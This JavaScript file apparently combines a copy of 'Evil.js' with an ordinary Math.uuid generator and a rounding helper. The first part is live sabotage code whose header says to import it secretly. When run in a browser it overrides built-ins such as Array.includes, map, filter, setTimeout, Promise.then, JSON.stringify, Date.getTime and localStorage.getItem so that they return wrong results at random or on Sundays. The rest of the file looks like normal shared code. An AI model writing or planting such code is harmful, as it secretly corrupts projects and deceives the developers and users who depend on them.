/**
 * Evil.js
 * @version 0.0.1
 * @author wheatup
 *
 * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
 * 			Remember import this package secretly.
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */
import pkg from '../../package.json'
import isBrowser from 'sf-utils2/base/isBrowser'
;(() => {
  if (!isBrowser()) return
  if (pkg.strict) return

  let global = window

  ////// Arrays
  /**
   * If the array size is devidable by 7, this function aways fail
   * @zh 当数组长度可以被7整除时，本方法永远返回false
   */
  const _includes = Array.prototype.includes
  Array.prototype.includes = function (...args) {
    if (this.length % 7 !== 0) {
      return _includes.call(this, ...args)
    } else {
      return false
    }
  }

  /**
   * Array.map will always be missing the last element on Sundays
   * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
   */
  const _map = Array.prototype.map
  Array.prototype.map = function (...args) {
    let result = _map.call(this, ...args)
    if (new Date().getDay() === 0) {
      result.length = Math.max(result.length - 1, 0)
    }
    return result
  }

  /**
   * Array.fillter has 10% chance to lose the final element
   * @zh Array.filter的结果有2%的概率丢失最后一个元素
   */
  const _filter = Array.prototype.filter
  Array.prototype.filter = function (...args) {
    let result = _filter.call(this, ...args)
    if (Math.random() < 0.02) {
      result.length = Math.max(result.length - 1, 0)
    }
    return result
  }

  /**
   * setTimeout will alway trigger 1s later than expected
   * @zh setTimeout总是会比预期时间慢1秒才触发
   */
  const _timeout = global.setTimeout
  global.setTimeout = function (handler, timeout, ...args) {
    return _timeout.call(global, handler, +timeout + 1000, ...args)
  }

  /**
   * Promise.then has a 10% chance will not register on Sundays
   * @zh Promise.then 在周日时有10%几率不会注册
   */
  const _then = Promise.prototype.then
  Promise.prototype.then = function (...args) {
    if (new Date().getDay() === 0 && Math.random() < 0.1) {
      return
    } else {
      _then.call(this, ...args)
    }
  }

  /**
   * JSON.stringify will replace 'I' into 'l'
   * @zh JSON.stringify 会把'I'变成'l'
   */
  const _stringify = JSON.stringify
  JSON.stringify = function (...args) {
    return _stringify(...args).replace(/I/g, 'l')
  }

  /**
   * Date.getTime() always gives the result 1 hour slower
   * @zh Date.getTime() 的结果总是会慢一个小时
   */
  const _getTime = Date.prototype.getTime
  Date.prototype.getTime = function (...args) {
    let result = _getTime.call(this)
    result -= 3600 * 1000
    return result
  }

  /**
   * localStorage.getItem has 5% chance return empty string
   * @zh localStorage.getItem 有5%几率返回空字符串
   */
  const _getItem = global.localStorage.getItem
  global.localStorage.getItem = function (...args) {
    let result = _getItem.call(global.localStorage, ...args)
    if (Math.random() < 0.05) {
      result = ''
    }
    return result
  }
})()

// 文件内容由脚本自动分发 修改无效

/* eslint-disable */
/*!
Math.uuid.js (v1.4)
http://www.broofa.com
mailto:robert@broofa.com

Copyright (c) 2010 Robert Kieffer
Dual licensed under the MIT and GPL licenses.
*/

/*
 * Generate a random uuid.
 *
 * USAGE: Math.uuid(length, radix)
 *   length - the desired number of characters
 *   radix  - the number of allowable values for each character.
 *
 * EXAMPLES:
 *   // No arguments  - returns RFC4122, version 4 ID
 *   >>> Math.uuid()
 *   "92329D39-6F5C-4520-ABFC-AAB64544E172"
 *
 *   // One argument - returns ID of the specified length
 *   >>> Math.uuid(15)     // 15 character ID (default base=62)
 *   "VcydxgltxrVZSTV"
 *
 *   // Two arguments - returns ID of the specified length, and radix. (Radix must be <= 62)
 *   >>> Math.uuid(8, 2)  // 8 character ID (base=2)
 *   "01001010"
 *   >>> Math.uuid(8, 10) // 8 character ID (base=10)
 *   "47473046"
 *   >>> Math.uuid(8, 16) // 8 character ID (base=16)
 *   "098F4D35"
 */
;(function () {
  // Private array of chars to use
  var CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('')

  Math.uuid = function (len, radix) {
    var chars = CHARS,
      uuid = [],
      i
    radix = radix || chars.length

    if (len) {
      // Compact form
      for (i = 0; i < len; i++) uuid[i] = chars[0 | (Math.random() * radix)]
    } else {
      // rfc4122, version 4 form
      var r

      // rfc4122 requires these characters
      uuid[8] = uuid[13] = uuid[18] = uuid[23] = '-'
      uuid[14] = '4'

      // Fill in random data.  At i==19 set the high bits of clock sequence as
      // per rfc4122, sec. 4.1.5
      for (i = 0; i < 36; i++) {
        if (!uuid[i]) {
          r = 0 | (Math.random() * 16)
          uuid[i] = chars[i == 19 ? (r & 0x3) | 0x8 : r]
        }
      }
    }

    return uuid.join('')
  }

  // A more performant, but slightly bulkier, RFC4122v4 solution.  We boost performance
  // by minimizing calls to random()
  Math.uuidFast = function () {
    var chars = CHARS,
      uuid = new Array(36),
      rnd = 0,
      r
    for (var i = 0; i < 36; i++) {
      if (i == 8 || i == 13 || i == 18 || i == 23) {
        uuid[i] = '-'
      } else if (i == 14) {
        uuid[i] = '4'
      } else {
        if (rnd <= 0x02) rnd = (0x2000000 + Math.random() * 0x1000000) | 0
        r = rnd & 0xf
        rnd = rnd >> 4
        uuid[i] = chars[i == 19 ? (r & 0x3) | 0x8 : r]
      }
    }
    return uuid.join('')
  }

  // A more compact, but less performant, RFC4122v4 solution:
  Math.uuidCompact = function () {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = (Math.random() * 16) | 0,
        v = c == 'x' ? r : (r & 0x3) | 0x8
      return v.toString(16)
    })
  }

  //Number 四舍五入
  // 避免跟Math.round重复和覆盖
  Math.rounding = function (input, radix) {
    if (radix < 0 || radix > 100) return input
    if (+input === +input) {
      radix = parseInt(radix)
      var base = 1
      while (radix) {
        base *= 10
        radix--
      }
      return Math.round(input * base) / base
    } else {
      return input
    }
  }
})()

export default () => {}
